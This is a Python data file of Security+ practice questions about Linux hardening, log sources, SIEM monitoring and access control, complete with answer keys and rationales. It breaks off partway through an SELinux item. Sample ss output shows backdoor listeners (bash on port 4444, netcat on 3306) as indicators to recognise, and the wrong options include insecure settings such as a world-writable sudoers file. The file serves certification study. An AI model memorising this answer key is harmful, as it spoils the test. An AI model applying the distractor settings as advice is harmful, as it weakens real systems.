"""CompTIA Security+ SY0-701 practice questions — topical batch: Linux command line,
Linux logs, and SELinux.

Scenarios are built around real Linux artifacts: /var/log/auth.log, /var/log/secure,
/var/log/messages, /var/log/syslog, /var/log/cron, journalctl, ps/ss/netstat output,
chmod/chown/sudo/visudo, systemctl, crontab, last/lastb, and SELinux enforcing/permissive/
disabled with getenforce/setenforce and AVC denials.
"""

QUESTIONS = [
    # ---------------------------------------------------------------
    # Hardening & secure baselines (6) — domain 4, objective 4.1
    # ---------------------------------------------------------------
    {
        "id": "tlnx-001",
        "domain": 4,
        "objective": "4.1",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Hardening & secure baselines",
        "stem": (
            "A Linux administrator generates an SSH key pair for a service account. The private key file "
            "/home/svcacct/.ssh/id_ed25519 currently shows permissions -rw-r--r-- (644), owned by svcacct:svcacct. "
            "SSH refuses to use the key and logs 'UNPROTECTED PRIVATE KEY FILE!'. Which command correctly "
            "remediates this baseline hardening issue?"
        ),
        "options": [
            {"id": "a", "text": "chmod 600 /home/svcacct/.ssh/id_ed25519", "correct": True,
             "rationale": "Correct. SSH requires the private key be readable/writable only by its owner (0600). "
                          "644 lets every local user read the key, so ssh-agent/sshd refuses to load it."},
            {"id": "b", "text": "chmod 640 /home/svcacct/.ssh/id_ed25519", "correct": False,
             "rationale": "Incorrect. 640 still grants read access to the file's group, which OpenSSH treats as "
                          "an unsafe permission for a private key; only owner access (600) is accepted."},
            {"id": "c", "text": "chown root:root /home/svcacct/.ssh/id_ed25519", "correct": False,
             "rationale": "Incorrect. Changing ownership to root would make the key unreadable by the svcacct "
                          "process that needs it, and does not address the underlying group/other read bits."},
            {"id": "d", "text": "chmod 755 /home/svcacct/.ssh/id_ed25519", "correct": False,
             "rationale": "Incorrect. 755 adds execute bits and keeps the file world-readable, which is worse "
                          "than the current 644 and does not satisfy SSH's private-key permission requirement."},
        ],
        "explanation": (
            "OpenSSH enforces that private key files be accessible only to their owner (mode 600). Any group or "
            "world read/write permission causes the client or agent to reject the key with an 'UNPROTECTED "
            "PRIVATE KEY FILE!' warning, since a locally readable private key is a lateral-movement risk."
        ),
    },
    {
        "id": "tlnx-002",
        "domain": 4,
        "objective": "4.1",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Hardening & secure baselines",
        "stem": (
            "An administrator needs to grant the 'deploy' user the ability to run 'systemctl restart nginx' as "
            "root without being able to run arbitrary commands as root, and wants the change to be syntax-checked "
            "before it takes effect so a typo cannot lock everyone out of sudo. What is the correct, safest way "
            "to make this change?"
        ),
        "options": [
            {"id": "a", "text": "Run 'visudo', add 'deploy ALL=(root) NOPASSWD: /bin/systemctl restart nginx' to a drop-in under /etc/sudoers.d/, and save", "correct": True,
             "rationale": "Correct. visudo locks /etc/sudoers and validates the grammar before writing, preventing "
                          "a malformed file from breaking sudo, and a command-scoped entry limits deploy to that "
                          "one command instead of full root access."},
            {"id": "b", "text": "Edit /etc/sudoers directly with vi and add 'deploy ALL=(ALL) ALL'", "correct": False,
             "rationale": "Incorrect. Editing /etc/sudoers directly bypasses syntax validation (a typo can break "
                          "sudo for everyone), and 'ALL=(ALL) ALL' grants full root, not the limited command "
                          "access requested."},
            {"id": "c", "text": "Add deploy to the wheel group with usermod -aG wheel deploy", "correct": False,
             "rationale": "Incorrect. On most distributions wheel members can run any command as root via sudo, "
                          "which is broader access than the single restart command that was requested."},
            {"id": "d", "text": "chmod 777 /etc/sudoers so deploy can edit its own permissions", "correct": False,
             "rationale": "Incorrect. Making /etc/sudoers world-writable is a severe privilege-escalation "
                          "vulnerability — any local user could grant themselves root by editing the file."},
        ],
        "explanation": (
            "visudo (or editing a validated drop-in file under /etc/sudoers.d/ via visudo -f) is the safe way to "
            "modify sudo policy because it syntax-checks before committing. Scoping the rule to the specific "
            "command enforces least privilege instead of granting blanket root access."
        ),
    },
    {
        "id": "tlnx-003",
        "domain": 4,
        "objective": "4.1",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Hardening & secure baselines",
        "stem": (
            "A vulnerability scan flags that the 'telnet' and 'rsh' services are running on a Linux server and "
            "recommends they be permanently removed from the startup sequence, not just stopped for the current "
            "session. Which command sequence correctly hardens the host per that recommendation?"
        ),
        "options": [
            {"id": "a", "text": "systemctl stop telnet.socket rsh.socket && systemctl disable telnet.socket rsh.socket", "correct": True,
             "rationale": "Correct. 'stop' halts the currently running service, and 'disable' removes the "
                          "unit's boot-time symlinks so it will not be re-activated on the next reboot."},
            {"id": "b", "text": "systemctl stop telnet.socket rsh.socket", "correct": False,
             "rationale": "Incorrect. 'stop' only ends the current session; without 'disable' the service will "
                          "start again automatically on the next reboot, failing the permanent-removal requirement."},
            {"id": "c", "text": "systemctl mask telnet.socket && systemctl start rsh.socket", "correct": False,
             "rationale": "Incorrect. This masks one service (good) but explicitly starts the other insecure "
                          "service (rsh), which is the opposite of the intended hardening action."},
            {"id": "d", "text": "kill -9 $(pgrep telnetd) and kill -9 $(pgrep rshd)", "correct": False,
             "rationale": "Incorrect. Killing the running processes stops them temporarily but does not touch "
                          "the systemd unit configuration, so both services restart on reboot or socket activation."},
        ],
        "explanation": (
            "Durable hardening requires both stopping the current instance and disabling (or masking) the unit "
            "so it cannot be started again at boot. Stopping or killing the process alone is not persistent."
        ),
    },
    {
        "id": "tlnx-004",
        "domain": 4,
        "objective": "4.1",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Hardening & secure baselines",
        "stem": (
            "During a baseline audit, a security analyst finds that a user's ~/.ssh directory has mode 755 "
            "(drwxr-xr-x). OpenSSH is silently ignoring the authorized_keys file inside it during login attempts. "
            "What is the most likely cause and correct fix?"
        ),
        "options": [
            {"id": "a", "text": "The .ssh directory is group/world-writable in effect too permissive; run 'chmod 700 ~/.ssh'", "correct": True,
             "rationale": "Correct. sshd requires the .ssh directory to be writable only by the owner (700). "
                          "755 allows other users to traverse/read it, so StrictModes causes sshd to ignore the "
                          "keys inside for security."},
            {"id": "b", "text": "Run 'chmod 777 ~/.ssh' so sshd can fully access the directory", "correct": False,
             "rationale": "Incorrect. 777 makes the directory writable by any local user, which is far less "
                          "secure and would still fail sshd's StrictModes permission check."},
            {"id": "c", "text": "Run 'chown root:root ~/.ssh' to give sshd ownership of the directory", "correct": False,
             "rationale": "Incorrect. sshd does not need to own the directory; changing ownership to root would "
                          "actually break the user's own access to their key material."},
            {"id": "d", "text": "Run 'chmod 644 ~/.ssh' to match the private key's expected permission", "correct": False,
             "rationale": "Incorrect. 644 on a directory removes the execute (traversal) bit needed to enter it "
                          "at all, and directories use 700, not the 600/644 pattern used for key files."},
        ],
        "explanation": (
            "With StrictModes enabled (the default), sshd checks that ~/.ssh and its contents are not writable "
            "by group or other. A world- or group-writable .ssh directory (755, 775, 777) causes sshd to silently "
            "refuse to use authorized_keys inside it; the fix is chmod 700 on the directory."
        ),
    },
    {
        "id": "tlnx-005",
        "domain": 4,
        "objective": "4.1",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Hardening & secure baselines",
        "stem": (
            "As part of a hardening sweep, an analyst wants to locate every file on the filesystem with the SUID "
            "bit set, since an unexpected SUID binary is a common local privilege-escalation vector. Which "
            "command accomplishes this?"
        ),
        "options": [
            {"id": "a", "text": "find / -perm -4000 -type f 2>/dev/null", "correct": True,
             "rationale": "Correct. -perm -4000 matches the SUID bit (4000 octal) on regular files, listing "
                          "every binary that runs with the file owner's (often root's) privileges regardless of "
                          "who executes it."},
            {"id": "b", "text": "find / -perm -2000 -type f 2>/dev/null", "correct": False,
             "rationale": "Incorrect. 2000 is the SGID bit, not SUID. It causes execution with the file's group "
                          "privileges, a related but different escalation vector than what was requested."},
            {"id": "c", "text": "grep -r 'suid' /etc/passwd", "correct": False,
             "rationale": "Incorrect. /etc/passwd stores user account records, not file permission bits; grepping "
                          "it for the literal string 'suid' will not locate SUID binaries."},
            {"id": "d", "text": "ls -la /etc/sudoers.d/", "correct": False,
             "rationale": "Incorrect. This lists sudo configuration drop-in files, which control sudo policy, "
                          "not filesystem SUID permission bits set on arbitrary binaries."},
        ],
        "explanation": (
            "'find / -perm -4000' searches the filesystem for files with the setuid bit, a standard hardening "
            "check because an attacker-writable or unnecessary SUID binary can be leveraged to escalate to root."
        ),
    },
    {
        "id": "tlnx-006",
        "domain": 4,
        "objective": "4.1",
        "type": "multiple_response",
        "difficulty": "expert",
        "study_topic": "Hardening & secure baselines",
        "stem": (
            "A security team is hardening /etc/ssh/sshd_config on an internet-facing bastion host. Select the "
            "THREE changes that reduce the attack surface for SSH-based compromise."
        ),
        "options": [
            {"id": "a", "text": "Set 'PermitRootLogin no'", "correct": True,
             "rationale": "Correct. Disabling direct root login forces attackers (and admins) to authenticate as "
                          "an unprivileged user first and then sudo, removing a high-value direct target."},
            {"id": "b", "text": "Set 'PasswordAuthentication no' and require public-key authentication", "correct": True,
             "rationale": "Correct. Disabling password auth eliminates the risk of brute-force or credential-"
                          "stuffing attacks against SSH, since keys cannot be guessed like passwords."},
            {"id": "c", "text": "Set 'MaxAuthTries' to a low value such as 3", "correct": True,
             "rationale": "Correct. Limiting authentication attempts per connection slows down online brute-"
                          "force attacks and causes sshd to drop the connection sooner."},
            {"id": "d", "text": "Set 'X11Forwarding yes' to allow administrators to run GUI tools remotely", "correct": False,
             "rationale": "Incorrect. Enabling X11 forwarding increases attack surface (X11 session hijacking) "
                          "and is not a hardening action; best practice on a bastion is to disable it."},
            {"id": "e", "text": "Set 'Protocol 1' for backward compatibility with legacy clients", "correct": False,
             "rationale": "Incorrect. SSH protocol version 1 has known cryptographic weaknesses and was removed "
                          "from modern OpenSSH; enabling it would weaken, not harden, the configuration."},
        ],
        "explanation": (
            "Hardened sshd_config settings disable direct root login, disable password authentication in favor "
            "of keys, and cap authentication attempts. X11 forwarding and the obsolete SSH protocol 1 both "
            "increase risk and are disabled on hardened bastion hosts, not enabled."
        ),
    },

    # ---------------------------------------------------------------
    # Log data sources (6) — domain 4, objective 4.9
    # ---------------------------------------------------------------
    {
        "id": "tlnx-007",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Log data sources",
        "stem": (
            "An analyst investigating suspicious remote access on a Red Hat Enterprise Linux server needs to "
            "find every SSH authentication attempt, including 'Failed password' and 'Accepted publickey' "
            "entries. Which log file should be reviewed on this RHEL host?"
        ),
        "options": [
            {"id": "a", "text": "/var/log/secure", "correct": True,
             "rationale": "Correct. On RHEL/CentOS-family distributions, authentication and authorization events "
                          "(including sshd and sudo activity) are written to /var/log/secure by default."},
            {"id": "b", "text": "/var/log/auth.log", "correct": False,
             "rationale": "Incorrect. /var/log/auth.log is the equivalent authentication log used on Debian/"
                          "Ubuntu-family distributions, not RHEL; RHEL does not populate this path by default."},
            {"id": "c", "text": "/var/log/messages", "correct": False,
             "rationale": "Incorrect. /var/log/messages captures general system and application messages on "
                          "RHEL, but SSH authentication attempts specifically are routed to /var/log/secure."},
            {"id": "d", "text": "/var/log/kern.log", "correct": False,
             "rationale": "Incorrect. kern.log (where present) records kernel-level messages such as driver and "
                          "hardware events, not application-layer SSH authentication attempts."},
        ],
        "explanation": (
            "Debian/Ubuntu systems log auth events to /var/log/auth.log, while RHEL/CentOS-family systems use "
            "/var/log/secure for the same purpose. Knowing which distribution family you are on is required to "
            "locate the right authentication log."
        ),
    },
    {
        "id": "tlnx-008",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Log data sources",
        "stem": (
            "A server running a modern systemd-based distribution stores logs in the binary journal rather than "
            "flat text files. An analyst wants to see only the sshd service's log entries from the last boot. "
            "Which command retrieves exactly that?"
        ),
        "options": [
            {"id": "a", "text": "journalctl -u sshd -b", "correct": True,
             "rationale": "Correct. '-u sshd' filters the journal to the sshd unit, and '-b' restricts output to "
                          "entries since the current (most recent) boot, matching the request precisely."},
            {"id": "b", "text": "journalctl -k -u sshd", "correct": False,
             "rationale": "Incorrect. '-k' filters to kernel messages only; combined with a unit filter it "
                          "returns effectively nothing useful, since sshd is a userspace service, not the kernel."},
            {"id": "c", "text": "grep sshd /var/log/auth.log", "correct": False,
             "rationale": "Incorrect. On a systemd-journal-only host without rsyslog forwarding logs to flat "
                          "files, /var/log/auth.log may not exist or may be empty, so this misses the data."},
            {"id": "d", "text": "journalctl --list-boots", "correct": False,
             "rationale": "Incorrect. This only lists the available boot IDs and timestamps; it does not filter "
                          "by service or return the sshd log entries themselves."},
        ],
        "explanation": (
            "journalctl -u <unit> filters to a specific systemd service, and -b limits results to the current "
            "boot. This is the correct approach when a distribution relies on the systemd journal rather than "
            "(or in addition to) traditional syslog text files."
        ),
    },
    {
        "id": "tlnx-009",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "A Linux server unexpectedly rebooted. The analyst suspects a failing disk controller caused a "
            "kernel panic and wants to review low-level kernel driver and hardware messages logged just before "
            "the crash, separate from general application and daemon chatter. Which log source is most "
            "appropriate?"
        ),
        "options": [
            {"id": "a", "text": "/var/log/kern.log (or 'dmesg' / 'journalctl -k')", "correct": True,
             "rationale": "Correct. Kernel-facility messages, including hardware and driver errors that can "
                          "precede a panic, are written to kern.log or retrievable via dmesg/journalctl -k."},
            {"id": "b", "text": "/var/log/auth.log", "correct": False,
             "rationale": "Incorrect. auth.log records authentication and authorization events such as logins "
                          "and sudo usage; it has no visibility into kernel driver or hardware errors."},
            {"id": "c", "text": "/var/log/cron", "correct": False,
             "rationale": "Incorrect. The cron log records scheduled job execution (crond activity), which is "
                          "unrelated to kernel-level hardware faults."},
            {"id": "d", "text": "last -x", "correct": False,
             "rationale": "Incorrect. 'last -x' shows login/logout and system shutdown/reboot records from "
                          "wtmp, not the detailed kernel driver messages needed to diagnose the crash cause."},
        ],
        "explanation": (
            "Kernel facility messages (driver errors, hardware faults, panics) are logged separately from "
            "general syslog traffic, typically to /var/log/kern.log, and are also viewable with dmesg or "
            "journalctl -k. Auth and cron logs are the wrong facility for this investigation."
        ),
    },
    {
        "id": "tlnx-010",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Log data sources",
        "stem": (
            "An analyst wants a report of failed login attempts on a Linux host, including local console and "
            "remote logins that never successfully authenticated, sourced from /var/log/btmp. Which command "
            "reads this specific log?"
        ),
        "options": [
            {"id": "a", "text": "lastb", "correct": True,
             "rationale": "Correct. 'lastb' reads /var/log/btmp specifically and lists failed login attempts, "
                          "which is exactly the bad-login record requested."},
            {"id": "b", "text": "last", "correct": False,
             "rationale": "Incorrect. 'last' reads /var/log/wtmp, which records successful logins and system "
                          "reboots, not failed authentication attempts."},
            {"id": "c", "text": "who", "correct": False,
             "rationale": "Incorrect. 'who' shows currently logged-in users from the utmp file; it has no "
                          "historical record of failed logins."},
            {"id": "d", "text": "w", "correct": False,
             "rationale": "Incorrect. 'w' shows who is logged in right now along with their current activity; "
                          "like 'who', it does not report failed login history."},
        ],
        "explanation": (
            "lastb reads /var/log/btmp and lists bad (failed) login attempts, complementing 'last' (successful "
            "logins from wtmp) and 'who'/'w' (currently logged-in sessions from utmp)."
        ),
    },
    {
        "id": "tlnx-011",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Log data sources",
        "stem": (
            "An analyst suspects an attacker planted a persistence mechanism using the cron scheduler and wants "
            "to review a historical record of every cron job that actually executed on the host, including the "
            "command line and the user context it ran under. Which log source provides this?"
        ),
        "options": [
            {"id": "a", "text": "/var/log/cron (or 'journalctl -u crond'/'journalctl -u cron')", "correct": True,
             "rationale": "Correct. The cron daemon logs each job invocation, including the user and command, "
                          "to /var/log/cron on RHEL-family systems or via the crond/cron systemd unit's journal "
                          "entries elsewhere."},
            {"id": "b", "text": "crontab -l", "correct": False,
             "rationale": "Incorrect. 'crontab -l' only lists the currently configured jobs for a user; it shows "
                          "no execution history and would not reveal a job the attacker already removed."},
            {"id": "c", "text": "/var/log/secure", "correct": False,
             "rationale": "Incorrect. /var/log/secure records authentication and authorization events, not the "
                          "record of individual cron job executions."},
            {"id": "d", "text": "/etc/crontab", "correct": False,
             "rationale": "Incorrect. /etc/crontab is a configuration file defining system-wide scheduled jobs; "
                          "it is not a log and contains no execution history."},
        ],
        "explanation": (
            "The cron log (/var/log/cron, or the crond unit's journal entries) records each job's execution "
            "history, which is essential for detecting cron-based persistence even after the crontab entry "
            "itself has been removed by the attacker."
        ),
    },
    {
        "id": "tlnx-012",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_response",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "A responder is investigating a suspected SSH brute-force attack followed by successful login and "
            "privilege escalation on an Ubuntu server. Select the TWO log sources that would contain direct "
            "evidence relevant to this specific investigation."
        ),
        "options": [
            {"id": "a", "text": "/var/log/auth.log — contains sshd 'Failed password' / 'Accepted publickey' and sudo invocation records", "correct": True,
             "rationale": "Correct. On Ubuntu, auth.log records both SSH authentication attempts and sudo "
                          "command usage, directly evidencing the brute force and any subsequent escalation."},
            {"id": "b", "text": "'last' output (reads /var/log/wtmp) — shows successful login sessions and their source, duration, and terminal", "correct": True,
             "rationale": "Correct. wtmp/last confirms which login attempts actually succeeded, from what "
                          "source, and for how long, corroborating the auth.log entries."},
            {"id": "c", "text": "/var/log/apt/history.log — records package installation history", "correct": False,
             "rationale": "Incorrect. apt history tracks software installs/upgrades and has no relevance to SSH "
                          "authentication or privilege escalation activity."},
            {"id": "d", "text": "/var/log/cups/error_log — records printing subsystem errors", "correct": False,
             "rationale": "Incorrect. CUPS logs relate to the printing service and are unrelated to SSH login "
                          "or sudo activity."},
        ],
        "explanation": (
            "auth.log is the primary Debian/Ubuntu source for SSH and sudo events, and wtmp (via 'last') "
            "confirms actual successful session details. Package manager and printing logs are irrelevant "
            "distractors for this scenario."
        ),
    },

    # ---------------------------------------------------------------
    # SIEM & monitoring (6) — domain 4, objective 4.4
    # ---------------------------------------------------------------
    {
        "id": "tlnx-013",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "An analyst reviewing /var/log/auth.log sees 200 lines like the following within a two-minute "
            "window, all from the same source IP, each for a different username:\n\n"
            "'sshd[2211]: Failed password for invalid user oracle from 203.0.113.44 port 51422 ssh2'\n\n"
            "Which single command best quantifies how many distinct usernames were targeted from that IP, to "
            "confirm a credential brute-force/spray pattern?"
        ),
        "options": [
            {"id": "a", "text": "grep '203.0.113.44' /var/log/auth.log | grep 'Failed password' | awk '{print $(NF-5)}' | sort -u | wc -l", "correct": True,
             "rationale": "Correct. This filters lines to the attacking IP and failed attempts, extracts the "
                          "username field, deduplicates it, and counts the unique usernames — directly measuring "
                          "spray breadth."},
            {"id": "b", "text": "tail -f /var/log/auth.log", "correct": False,
             "rationale": "Incorrect. 'tail -f' only streams new lines in real time; it does not search "
                          "historical entries or produce any count of unique usernames."},
            {"id": "c", "text": "chmod 600 /var/log/auth.log", "correct": False,
             "rationale": "Incorrect. This changes the log file's permission bits; it performs no analysis and "
                          "does not answer the investigative question."},
            {"id": "d", "text": "last -a | grep 203.0.113.44", "correct": False,
             "rationale": "Incorrect. 'last' reports successful logins from wtmp; failed password attempts "
                          "against invalid users never create wtmp entries, so this would return nothing."},
        ],
        "explanation": (
            "Piping grep (to isolate the attacking source and failed attempts), awk (to extract the username "
            "field), sort -u, and wc -l is the standard command-line pattern for quantifying unique targeted "
            "accounts from log text, confirming brute-force/spray behavior."
        ),
    },
    {
        "id": "tlnx-014",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "easy",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "During an active incident, an analyst wants to watch new entries appear in /var/log/auth.log in "
            "real time on the terminal as the attacker continues to interact with the compromised host, without "
            "having to re-run a search command repeatedly. Which command should be used?"
        ),
        "options": [
            {"id": "a", "text": "tail -f /var/log/auth.log", "correct": True,
             "rationale": "Correct. 'tail -f' follows the file and prints new lines as they are appended, giving "
                          "a live, continuously updating view of the log during the active incident."},
            {"id": "b", "text": "head /var/log/auth.log", "correct": False,
             "rationale": "Incorrect. 'head' prints only the first lines of the file once and exits; it does not "
                          "provide any ongoing, real-time view of new entries."},
            {"id": "c", "text": "cat /var/log/auth.log", "correct": False,
             "rationale": "Incorrect. 'cat' dumps the entire file's current contents once and exits; it will not "
                          "show new lines appended after the command runs."},
            {"id": "d", "text": "wc -l /var/log/auth.log", "correct": False,
             "rationale": "Incorrect. 'wc -l' only prints the current line count of the file; it provides no "
                          "content and no real-time monitoring capability."},
        ],
        "explanation": (
            "tail -f (or tail -F to also handle log rotation) is the standard way to watch a growing log file "
            "live from the command line during active monitoring or incident response."
        ),
    },
    {
        "id": "tlnx-015",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "An analyst runs 'ss -tulpn' on a web server and sees this unexpected line among the results:\n\n"
            "'tcp   LISTEN 0  128  0.0.0.0:4444   0.0.0.0:*   users:((\"bash\",pid=8842,fd=3))'\n\n"
            "What does this output most strongly indicate?"
        ),
        "options": [
            {"id": "a", "text": "A bash process is listening on all interfaces on port 4444, consistent with a reverse/bind shell backdoor", "correct": True,
             "rationale": "Correct. A shell binary bound as a LISTEN socket on 0.0.0.0 (all interfaces) on a "
                          "classic attacker port (4444, a common Metasploit default) is a strong indicator of a "
                          "backdoor listener, not a legitimate web service."},
            {"id": "b", "text": "The web server's TLS certificate has expired and nginx is falling back to bash for error handling", "correct": False,
             "rationale": "Incorrect. Certificate expiration is unrelated to sockets or process binaries; nginx "
                          "does not 'fall back' to spawning a bash listener for TLS errors."},
            {"id": "c", "text": "This is normal output showing an established outbound SSH connection", "correct": False,
             "rationale": "Incorrect. The state shown is LISTEN, not ESTABLISHED, and the process is bash, not "
                          "sshd; this is not an outbound SSH session."},
            {"id": "d", "text": "Port 4444 is the default port for the cron daemon and this entry is expected", "correct": False,
             "rationale": "Incorrect. cron/crond does not open network listening sockets at all; it is purely a "
                          "local job scheduler, so this explanation is fabricated."},
        ],
        "explanation": (
            "ss -tulpn shows listening (l) TCP/UDP sockets with the owning process. A shell process listening on "
            "an unfamiliar high port across all interfaces is a classic backdoor/reverse-shell indicator that "
            "should trigger immediate investigation and containment."
        ),
    },
    {
        "id": "tlnx-016",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A monitoring alert fires because a compromised host repeatedly beacons out to an external IP every "
            "60 seconds. The analyst suspects a scheduled task is responsible and wants to check ALL users' "
            "crontabs at once for a suspicious entry, since the malicious job may not be in root's crontab. "
            "Which command should be run?"
        ),
        "options": [
            {"id": "a", "text": "for u in $(cut -f1 -d: /etc/passwd); do echo \"== $u ==\"; crontab -u \"$u\" -l 2>/dev/null; done", "correct": True,
             "rationale": "Correct. This iterates every local account and lists each one's crontab, which is "
                          "necessary because a malicious cron entry could be planted under any user, not just root."},
            {"id": "b", "text": "crontab -l", "correct": False,
             "rationale": "Incorrect. Run with no -u flag, this only shows the crontab of the user currently "
                          "running the command, missing any malicious entries under other accounts."},
            {"id": "c", "text": "cat /etc/hosts", "correct": False,
             "rationale": "Incorrect. /etc/hosts maps hostnames to IP addresses for local resolution; it has no "
                          "relationship to scheduled cron jobs."},
            {"id": "d", "text": "systemctl list-timers --all | grep root", "correct": False,
             "rationale": "Incorrect. This lists systemd timer units (a different scheduling mechanism than "
                          "cron) and filters only for the string 'root', which would miss both non-systemd cron "
                          "jobs and jobs under other usernames."},
        ],
        "explanation": (
            "Because cron persistence can be planted under any local user's crontab (as well as /etc/cron.d, "
            "/etc/crontab, and the periodic cron.{hourly,daily} directories), a thorough sweep must enumerate "
            "every account's crontab, not just the current user's or root's."
        ),
    },
    {
        "id": "tlnx-017",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "An analyst wants a live, full listing of every running process on a Linux host, including those "
            "not attached to a controlling terminal, along with the full command line used to start each one, "
            "to identify a suspicious process masquerading as a kernel thread. Which command is correct?"
        ),
        "options": [
            {"id": "a", "text": "ps aux", "correct": True,
             "rationale": "Correct. 'ps aux' shows every process on the system (a = all with a tty or without, "
                          "x = processes without a controlling terminal, u = user-oriented format including the "
                          "command), which is the standard full-process snapshot."},
            {"id": "b", "text": "ss -tulpn", "correct": False,
             "rationale": "Incorrect. ss reports network sockets and their owning processes, not a full listing "
                          "of every running process regardless of network activity."},
            {"id": "c", "text": "who -a", "correct": False,
             "rationale": "Incorrect. 'who -a' reports information about logged-in users and system events, not "
                          "the full running process table."},
            {"id": "d", "text": "systemctl status", "correct": False,
             "rationale": "Incorrect. 'systemctl status' shows the overall system/unit tree summary for systemd-"
                          "managed services; it does not enumerate every individual OS process with full command lines."},
        ],
        "explanation": (
            "ps aux (or the POSIX-style 'ps -ef') is the standard command for a complete process listing with "
            "command lines, essential for spotting a malicious process disguising its name to blend in with "
            "legitimate kernel threads (e.g., '[kworker/0:1]' spoofing)."
        ),
    },
    {
        "id": "tlnx-018",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_response",
        "difficulty": "expert",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "Reviewing 'ss -tulpn' output on a database server, an analyst sees:\n\n"
            "tcp LISTEN 0 128 127.0.0.1:3306 0.0.0.0:* users:((\"mysqld\",pid=980,fd=21))\n"
            "tcp LISTEN 0 128 0.0.0.0:22    0.0.0.0:* users:((\"sshd\",pid=754,fd=3))\n"
            "tcp LISTEN 0 128 0.0.0.0:3306  0.0.0.0:* users:((\"nc\",pid=9931,fd=4))\n\n"
            "Select the TWO statements that correctly interpret this output."
        ),
        "options": [
            {"id": "a", "text": "The legitimate MySQL instance (pid 980) is correctly bound only to loopback (127.0.0.1), which is expected hardening", "correct": True,
             "rationale": "Correct. Binding the database to 127.0.0.1 restricts connections to the local host "
                          "only, preventing direct network exposure of the DB port — a normal hardening posture."},
            {"id": "b", "text": "A second listener on the same port 3306 using 'nc' (netcat) bound to 0.0.0.0 is highly suspicious and likely a rogue listener impersonating the database port", "correct": True,
             "rationale": "Correct. netcat is not a database server; a process named 'nc' listening on 0.0.0.0:"
                          "3306 alongside the real mysqld is consistent with an attacker opening a backdoor on a "
                          "port chosen to blend in with expected traffic."},
            {"id": "c", "text": "This output proves sshd (pid 754) has been compromised because it is bound to 0.0.0.0", "correct": False,
             "rationale": "Incorrect. sshd listening on 0.0.0.0:22 is completely normal for a server meant to "
                          "accept remote administrative connections from any permitted source; this alone is not "
                          "evidence of compromise."},
            {"id": "d", "text": "Two listeners cannot simultaneously exist on the same port number, so this output must be fabricated", "correct": False,
             "rationale": "Incorrect. Two sockets can both show LISTEN on port 3306 if bound to different "
                          "addresses (127.0.0.1 vs 0.0.0.0) as shown here; the output is technically valid and "
                          "should be treated as a real finding, not dismissed."},
        ],
        "explanation": (
            "ss -tulpn output must be read carefully: bind address matters (loopback-only mysqld is expected), "
            "sshd on 0.0.0.0:22 is normal, but a non-database process (netcat) also listening on the database "
            "port is a red flag for a rogue/backdoor listener that needs immediate investigation."
        ),
    },

    # ---------------------------------------------------------------
    # Access control models (5) — domain 4, objective 4.6
    # ---------------------------------------------------------------
    {
        "id": "tlnx-019",
        "domain": 4,
        "objective": "4.6",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Access control models",
        "stem": (
            "A Linux file server uses standard owner/group/other permission bits, and the owner of each file "
            "decides who else may read or write it via chmod/chown. New employees are automatically granted "
            "whatever access the previous file owner configured, without any centrally enforced policy. Which "
            "access control model does this describe?"
        ),
        "options": [
            {"id": "a", "text": "Discretionary access control (DAC)", "correct": True,
             "rationale": "Correct. Standard Linux/UNIX filesystem permissions (owner/group/other via chmod/"
                          "chown) are the textbook example of DAC: the resource owner decides access at their "
                          "own discretion, with no central authority enforcing labels."},
            {"id": "b", "text": "Mandatory access control (MAC)", "correct": False,
             "rationale": "Incorrect. MAC (e.g., SELinux) enforces access using system-wide security labels set "
                          "by an administrator/policy, which the file owner cannot override — the opposite of "
                          "the owner-controlled scenario described."},
            {"id": "c", "text": "Role-based access control (RBAC)", "correct": False,
             "rationale": "Incorrect. RBAC assigns permissions based on a user's organizational role rather than "
                          "individual file ownership decisions; standard chmod/chown permissions are not "
                          "role-driven."},
            {"id": "d", "text": "Rule-based access control", "correct": False,
             "rationale": "Incorrect. Rule-based access control applies a global set of if/then rules (as on a "
                          "firewall or router ACL) rather than letting each individual resource owner set "
                          "permissions independently."},
        ],
        "explanation": (
            "Standard Linux filesystem permissions are DAC: the file/directory owner decides access via chmod "
            "and chown at their own discretion. This contrasts with SELinux's MAC model, where labels and policy "
            "are centrally enforced and cannot be overridden by the file owner."
        ),
    },
    {
        "id": "tlnx-020",
        "domain": 4,
        "objective": "4.6",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Access control models",
        "stem": (
            "On a RHEL server with SELinux enabled, a file owner runs 'chmod 777 /var/www/html/upload.php' "
            "granting full read/write/execute to everyone, yet the Apache process still cannot write to that "
            "file and the audit log shows an AVC denial. What best explains why the discretionary permission "
            "change was not sufficient?"
        ),
        "options": [
            {"id": "a", "text": "SELinux enforces mandatory access control on top of DAC; the file's security context does not permit the httpd_t domain to write to it, and the file owner cannot override that with chmod", "correct": True,
             "rationale": "Correct. SELinux is a MAC layer evaluated after standard DAC permissions. Even with "
